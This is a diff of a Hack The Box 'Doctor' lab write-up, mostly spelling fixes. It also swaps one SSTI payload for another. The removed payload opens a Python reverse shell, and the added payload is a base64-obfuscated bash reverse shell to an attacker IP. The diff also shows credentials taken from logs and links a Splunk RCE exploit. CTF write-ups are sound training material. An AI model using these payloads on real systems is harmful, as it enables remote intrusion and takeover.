@@ -1,6 +1,6 @@
 ![](doctor_banner.png)
 
-<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></img></a>
+<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></a>
 </p>
 
 # Scanning
@@ -43,7 +43,7 @@ PORT     STATE SERVICE  VERSION
 
 	  info@doctors.htb
 	 
-- I add domain `doctors.htb` from that email to `/etc/hosts` and check i there is any diffrence .
+- I add domain `doctors.htb` from that email to `/etc/hosts` and check i there is any difference.
 - **goto** `doctors.htb` redirected to `http://doctors.htb/login?next=%2F` and land on a login page .
 
 ### Enumerating doctors.htb
@@ -62,12 +62,12 @@ Your account has been created, with a time limit of twenty minutes!
 - **goto** `http://doctors.htb/archive` got blank page viewing source got `<title>Archive</title>`
 
 - this domain `Doctor Secure Messaging` all about posting staff messages.
-- as a loged in user i can post a message, so i create a new message.
+- as a logged in user i can post a message, so i create a new message.
 - my post is on `http://doctors.htb/post/2` 
-- this shows `post/2` but this is my first post, i check first post and this is a post from admin and nothing intrested here.
+- this shows `post/2` but this is my first post, i check first post and this is a post from admin and nothing interested here.
 - I also check `/archive` source again and the `<title>` tag now updated with my post title
 - try injections on `http://doctors.htb/post/new` page
-- i use diffrent injecion payloads from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+- i use different injection payloads from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
 - found 2 successful injections in `http://doctors.htb/post/new`
     - **CSRF** in `Content` field
     - **SSTI** in `title` field
@@ -99,12 +99,17 @@ https://portswigger.net/web-security/csrf
 
 #### SSTI Test
 
-**Payload** `{{7*7}}`
+**Payload** 
+
+```py
+{{ 7 * 7 }}
+```
 
 **Response** in `/archive` page source code `<title>` tag updated as `49`
 
 
 # User Exploit
+
 *Both injection give shell in the box*
 
 ## with CSRF
@@ -120,7 +125,11 @@ https://portswigger.net/web-security/csrf
 
 ## with SSTI
 
-**Payload :** `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"tun0\",4141));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}`
+**Payload :**
+
+```py
+{% with ssti = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE1LjcxLzQxNDEgMD4mMSc= | base64 -d | bash")["read"]() %} %257B%257Bssti%257D%257D {% endwith %}
+```
 
 got that working payload from : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-popen-without-guessing-the-offset
 
@@ -137,7 +146,7 @@ got that working payload from : https://github.com/swisskyrepo/PayloadsAllTheThi
 
 	  /var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
 
-- got password rightaway, i tried that password for both users and worked for user `shaun`
+- got password, i tried that password for both users and worked for user `shaun`
 	`shaun:Guitar123`
 
 ```
@@ -148,7 +157,7 @@ aaaab5f8************************
 
 # Local Enumeration
 
-- I alredy found a Auth RCE for [Splunk](README.md#splunk) so first i try to login with these cred in splunk on port 8089
+- I already found a Auth RCE for [Splunk](README.md#splunk) so first i try to login with these cred in splunk on port 8089
 - login successful and i run that [exploit](exploit/SplunkWhisperer2_RCE.py)
 
 # Root Privesc
